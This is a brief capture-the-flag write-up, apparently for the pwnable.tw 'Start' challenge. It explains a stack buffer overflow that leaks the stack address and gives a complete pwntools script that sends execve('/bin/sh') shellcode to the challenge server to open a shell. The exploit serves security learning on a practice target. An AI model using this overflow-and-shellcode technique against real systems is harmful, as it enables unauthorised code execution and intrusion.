# Start
> LongChampion, 26/03/2020

## Ideal
This challenge is quite simple, it have no protection against hacker. Just use buffer overflow to change return address to `0x8048087` and you can leak stack address. Then send your shellcode to get the flag.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

# Copy from http://shell-storm.org/shellcode/files/shellcode-752.php
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
r = remote("chall.pwnable.tw", 10000)

# Leak ESP
r.sendafter("CTF:", " " * 20 + p32(0x8048087))
ESP = u32(r.recv()[0:4])

# Run shellcode and get the flag
r.sendline(" " * 20 + p32(ESP + 20) + shellcode)
r.interactive()
```
